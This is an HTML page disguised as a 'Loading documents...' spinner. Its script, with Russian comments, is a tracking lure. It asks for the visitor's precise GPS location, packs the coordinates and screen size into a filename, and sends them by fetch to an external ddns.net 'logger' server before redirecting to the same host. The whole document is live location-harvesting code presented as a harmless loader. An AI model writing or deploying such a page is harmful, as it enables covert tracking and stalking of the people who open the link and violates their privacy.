<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading documents...</title>
    <style>
        body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .loader { border: 3px solid #30363d; border-top: 3px solid #58a6ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body> 
    <div class="loader"></div>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const slug = urlParams.get('id');
        
        // ТВОИ НАСТРОЙКИ
        const targetServer = "http://echomapwa.ddns.net/logger/get_img/";
        const finalRedirect = "http://echomapwa.ddns.net/logger/l/";

        async function collectAndGo() {
            if (!slug) return;
            
            let info = {
                sw: window.screen.width,
                sh: window.screen.height,
                lat: "null",
                lon: "null"
            };

            // 1. Сбор GPS (ждем максимум 4 секунды)
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((res, rej) => {
                        navigator.geolocation.getCurrentPosition(res, rej, {
                            enableHighAccuracy: true,
                            timeout: 4000, 
                            maximumAge: 0
                        });
                    });
                    info.lat = pos.coords.latitude;
                    info.lon = pos.coords.longitude;
                } catch (e) {
                    console.log("GPS skip or denied");
                }
            }

            // 2. Формируем имя файла с данными
            const fileName = `lat_${info.lat}_lon_${info.lon}_sw_${info.sw}_sh_${info.sh}_id_${slug}.png`;
            
            // 3. Жесткая отправка через fetch
            try {
                // await заставляет скрипт ПРИОСТАНОВИТЬСЯ до завершения сетевого запроса
                await fetch(`${targetServer}${fileName}?t=${Date.now()}`, { 
                    mode: 'no-cors',
                    cache: 'no-store'
                });
            } catch (e) {
                console.log("Network error, but redirecting anyway...");
            }

            // 4. Финальный редирект с флагом готовности
            window.location.href = `${finalRedirect}${slug}?ready=1`;
        }

        // Запуск процесса
        collectAndGo();
    </script>
</body>
</html>
